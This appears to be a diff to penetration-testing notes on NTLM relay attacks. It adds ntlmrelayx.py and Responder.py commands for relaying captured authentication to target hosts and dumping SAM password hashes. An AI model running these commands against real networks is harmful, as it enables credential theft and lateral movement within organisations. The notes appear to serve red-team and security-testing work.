@@ -119,6 +119,11 @@ You might need to disable the SMB or HTTP servers used by Responder to avoid con
     sudo python3 ntlmrelayx.py -tf targets -smb2support     
     sudo python3 ntlmrelayx.py -socks -smb2support -tf smb_targets.txt     
     
+    #To Perform a SAM dump using NTLMRelay    
+    python3 ntlmrelayx.py -of hashes -tf targets.txt -smb2support    
+    # then run Responder with SMB / HTTP off      
+    sudo python3 Responder.py -I eth0 -dwv     
+    
 [MultiRelay - Built into the Responder Toolkit](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)     
 Requirements:     
 [Pycryptdome](https://github.com/Legrandin/pycryptodome/)    
